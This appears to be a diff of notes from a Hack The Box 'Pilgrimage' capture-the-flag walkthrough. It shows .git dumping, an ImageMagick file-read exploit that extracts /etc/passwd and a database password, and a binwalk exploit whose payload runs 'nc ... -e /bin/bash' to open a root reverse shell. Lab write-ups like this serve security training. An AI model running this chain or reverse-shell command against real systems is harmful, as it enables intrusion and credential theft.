@@ -1,4 +1,8 @@
-└─$ sudo dirsearch -u http://pilgrimage.htb/
+#### Port scanning and Web Enum
+only port 22 and 80 open. fuzz dir of web
+
+`└─$ sudo dirsearch -u http://pilgrimage.htb/`
+```
 [sudo] password for ed: 
 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
   from pkg_resources import DistributionNotFound, VersionConflict
@@ -57,9 +61,12 @@ Target: http://pilgrimage.htb/
 [10:32:44] 302 -    0B  - /logout.php  ->  /
 [10:32:57] 200 -    6KB - /register.php
 [10:33:07] 301 -  169B  - /tmp  ->  http://pilgrimage.htb/tmp/
+```
 
+find .git path, we can extract original file by using gittool set.
 
-./gitdumper.sh http://pilgrimage.htb/.git/ dest-dir ~/oscptest/prlg.htb/
+`./gitdumper.sh http://pilgrimage.htb/.git/ dest-dir ~/oscptest/prlg.htb/`
+```
 ###########
 # GitDumper is part of https://github.com/internetwache/GitTools
 #
@@ -79,9 +86,9 @@ Target: http://pilgrimage.htb/
 [+] Downloaded: COMMIT_EDITMSG
 [+] Downloaded: index
 [-] Downloaded: packed-refs
-
-
-─$ ./extractor.sh ~/oscptest/pilg.htb/dest-dir/ ~/oscptest/pilg.htb/ex
+```
+`─$ ./extractor.sh ~/oscptest/pilg.htb/dest-dir/ ~/oscptest/pilg.htb/ex`
+```
 ###########
 # Extractor is part of https://github.com/internetwache/GitTools
 #
@@ -95,18 +102,20 @@ Target: http://pilgrimage.htb/
 [+] Found commit: e1a40beebc7035212efdcb15476f9c994e3634a7
 [+] Found folder: /home/ed/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets
 [+] Found file: /home/ed/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/assets/bulletproof.php
+```
+after research on these files, find a user name of this site
 
-
-
-└─$ cat commit-meta.txt 
+`└─$ cat commit-meta.txt `
+```
 tree f3e708fd3c3689d0f437b2140e08997dbaff6212
 author emily <emily@pilgrimage.htb> 1686132708 +1000
 committer root <root@pilgrimage.htb> 1686132708 +1000
 
 Pilgrimage image shrinking service initial commit.
-
-
-└─$ cat login.php 
+```
+view the login page
+`└─$ cat login.php `
+```
 <?php
 session_start();
 if(isset($_SESSION['user'])) {
@@ -130,21 +139,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
     header("Location: /login.php?message=Login failed&status=fail");
   }
 }
-
+```
+#### foot hold
+a interesting file in them named magick, with vuln
 
 https://github.com/entr0pie/CVE-2022-44268
 
-http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/6a3e05b2b802b.png&status=success
+use this exploit file to create payload .png file and upload to the upload page
+. use passwd file as test
 
+`python3 CVE-2022-44268.py /etc/passwd  # Create output.png`
 
-python3 CVE-2022-44268.py /etc/passwd  # Create output.png
+`http://pilgrimage.htb/?message=http://pilgrimage.htb/shrunk/6a3e05b2b802b.png&status=success`
+we will get a resized png file
 
 http://pilgrimage.htb/shrunk/6a3e05b2b802b.png
 
-
-└─$ ~/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/magick identify -verbose 6a3e05b2b802b.png > out
-                                                                                                              
-┌──(ed㉿kali)-[~/oscptest/pilg.htb/CVE-2022-44268]
+`└─$ ~/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/magick identify -verbose 6a3e05b2b802b.png > out`
+the target file will be integrited in this png                                                                                                        
+`┌──(ed㉿kali)-[~/oscptest/pilg.htb/CVE-2022-44268]`
+```
 └─$ cat out            
 Image:
   Filename: 6a3e05b2b802b.png
@@ -185,28 +199,6 @@ Image:
              1: (19,19,19) #131313 gray(19)
              1: (21,21,21) #151515 gray(21)
 <Snip>...
-    255: (255,255,255,1) #FFFFFFFF graya(255,1)
-  Rendering intent: Undefined
-  Gamma: 0.45455
-  Matte color: grey74
-  Background color: white
-  Border color: srgb(223,223,223)
-  Transparent color: none
-  Interlace: None
-  Intensity: Undefined
-  Compose: Over
-  Page geometry: 128x1+0+0
-  Dispose: Undefined
-  Iterations: 0
-  Compression: Zip
-  Orientation: Undefined
-  Properties:
-    date:create: 2026-06-26T04:53:35+00:00
-    date:modify: 2026-06-26T04:53:07+00:00
-    date:timestamp: 2026-06-26T04:54:39+00:00
-    just for test!: 
-    png:bKGD: chunk was found (see Background color, above)
-    png:gAMA: gamma=0.45455 (See Gamma, above)
     png:IHDR.bit-depth-orig: 8
     png:IHDR.bit_depth: 8
     png:IHDR.color-type-orig: 0
@@ -228,18 +220,21 @@ Image:
 2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
 783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
 <Snip>...
-
-
-
-
+```
+decode the hex string to plain text
+```
 └─$ python3 -c "print(bytes.fromhex('726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f6c616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a'))"
 b'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/lache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n
 
 emily:x:1000:1000:emily,,,:/home/emily:/bin/bash\n
 
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n_laurel:x:998:998::/var/log/laurel:/bin/false\n'
+```
+try to inclusion ssh private key of emily, but failed.
+we we noticed a DB file at "$db = new PDO('sqlite:/var/db/pilgrimage')".
 
-
+perform this process again
+```
 http://pilgrimage.htb/shrunk/6a3e078666234.png
 
 └─$ wget http://pilgrimage.htb/shrunk/6a3e078666234.png
@@ -253,12 +248,13 @@ Saving to: '6a3e078666234.png'
 6a3e078666234.png           100%[=========================================>]     299  --.-KB/s    in 0s      
 
 2026-06-26 13:01:09 (64.7 MB/s) - '6a3e078666234.png' saved [299/299]
+```
+~/oscptest/pilg.htb/ex/0-e1a40beebc7035212efdcb15476f9c994e3634a7/magick identify -verbose 6a3e0a6f058b6.png  |  grep -Pv "^( |Image)" | xxd
+use grep to regx the hex string and then output to xxd -r -p to make it to binary format, 
+`xd -p (often written as xxd -plain) outputs a plain hex dump of a file or standard input.`
 
-
-
-
-
-└─$ sqlite3 pil.sqlite                                                      
+`─$ sqlite3 pil.sqlite`
+```
 SQLite version 3.46.1 2024-08-13 09:16:08
 Enter ".help" for usage hints.
 sqlite> .databse
@@ -271,13 +267,16 @@ sqlite> .tables
 images  users 
 sqlite> select * from users;
 emily|abigchonkyboi123
+```
 
-
-└─$ ssh emily@10.129.6.69
+`└─$ ssh emily@10.129.6.69`
+```
 uid=1000(emily) gid=1000(emily) groups=1000(emily)
+```
 
-
-
+#### privi escalte
+check the processes
+```
 root         699  0.0  0.0   6816  3008 ?        Ss   12:28   0:00 /bin/bash /usr/sbin/malwarescan.sh
 root         701  0.0  0.1 220796  6776 ?        Ssl  12:28   0:00 /usr/sbin/rsyslogd -n -iNONE
 root         704  0.0  0.1  13852  6980 ?        Ss   12:28   0:00 /lib/systemd/systemd-logind
@@ -287,8 +286,10 @@ root         733  0.0  0.0   6816  2292 ?        S    12:28   0:00 /bin/bash /us
 root         737  0.0  0.1  13352  7416 ?        Ss   12:28   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-
 root         744  0.0  0.0   5844  1716 tty1     Ss+  12:28   0:00 /sbin/agetty -o -p -- \u --noclear tty1 lin
 root         803  0.0  0.0      0     0 ?        S    12:28   0:00 [hwmon1]
+```
 
-emily@pilgrimage:~$ ls -la /usr/sbin/malwarescan.sh
+`emily@pilgrimage:~$ ls -la /usr/sbin/malwarescan.sh`
+```
 -rwxr--r-- 1 root root 474 Jun  1  2023 /usr/sbin/malwarescan.sh
 emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh
 #!/bin/bash
@@ -305,15 +306,15 @@ blacklist=("Executable script" "Microsoft executable")
 		fi
 	done
 done
-
-emily@pilgrimage:~$ binwalk 
-
+```
+reaseach about inotifywait and binwalk. nothing found on inotifywait, for binwalk : https://github.com/adhikara13/CVE-2022-4510-WalkingPath
+`emily@pilgrimage:~$ binwalk `
+```
 Binwalk v2.3.2
-
-
-https://github.com/adhikara13/CVE-2022-4510-WalkingPath
-
-emily@pilgrimage:~$ wget http://10.10.16.25:/walkingpath.py
+```
+traffer this exploit file to target machine
+`emily@pilgrimage:~$ wget http://10.10.16.25:/walkingpath.py`
+```
 --2026-06-26 17:47:51--  http://10.10.16.25/walkingpath.py
 Connecting to 10.10.16.25:80... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -323,7 +324,9 @@ Saving to: 'walkingpath.py'
 walkingpath.py              100%[=========================================>]   3.31K  --.-KB/s    in 0.001s  
 
 2026-06-26 17:47:51 (4.49 MB/s) - 'walkingpath.py' saved [3391/3391]
-
+```
+use it generate a malicious png, for the root process to trigger
+```
 echo "1" > input.png
 
 python3 walkingpath.py command --command "nc 10.10.16.25 8822 -e /bin/bash" input.png
@@ -359,10 +362,15 @@ class MaliciousExtractor(binwalk.core.plugin.Plugin):
             shutil.rmtree(os.path.join(os.path.dirname(os.path.abspath(__file__)), '__pycache__'))
 
 cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
+```
 
-
-└─$ nc -nvlp 8822
+`└─$ nc -nvlp 8822`
+```
 listening on [any] 8822 ...
 connect to [10.10.16.25] from (UNKNOWN) [10.129.6.69] 53814
 id
 uid=0(root) gid=0(root) groups=0(root)
+```
+
+#### lesson learned
+- traffer file format from hex to binary , xxd -r -p
